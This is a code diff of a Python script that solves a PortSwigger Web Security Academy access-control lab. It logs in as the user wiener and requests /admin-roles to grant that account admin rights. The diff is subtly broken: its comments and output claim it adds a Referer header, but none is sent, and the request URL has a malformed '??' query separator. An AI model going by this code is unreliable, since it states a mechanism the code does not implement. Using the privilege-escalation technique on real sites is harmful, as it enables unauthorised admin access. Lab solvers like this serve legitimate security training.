@@ -4,10 +4,10 @@
 #
 # Date: 5/9/2023
 #
-# PortSwigger LAB: Multi-step process with no access control on one step
+# PortSwigger LAB: Referer-based access control
 #
 # Steps: 1. Login as wiener
-#        2. Upgrade wiener to be an admin bypassing the first step
+#        2. Upgrade wiener to be an admin by adding Referer header
 #
 ##########################################################################
 
@@ -31,17 +31,12 @@ try:  # login as wiener
         print(
             Fore.WHITE + "1. Logging in as wiener.. " + Fore.GREEN + "OK")
         session = login.cookies.get("session")
-        try:  # upgrade wiener to be an admin bypassing the first step
+        try:  # upgrade wiener to be an admin by adding Referer header
             cookies = {"session": session}
-            data = {
-                "username": "wiener",
-                "action": "upgrade",
-                "confirmed": "true"
-            }
-            upgrade_wiener = requests.post(
-                f"{url}/admin-roles", data, cookies=cookies)
+            upgrade_wiener = requests.get(
+                f"{url}/admin-roles??username=wiener&action=upgrade", cookies=cookies)
             print(
-                Fore.WHITE + "2. Upgrading wiener to be an admin bypassing the first step.. " + Fore.GREEN + "OK")
+                Fore.WHITE + "2. Upgrading wiener to be an admin by adding Referer header.. " + Fore.GREEN + "OK")
             print(
                 Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
         except:
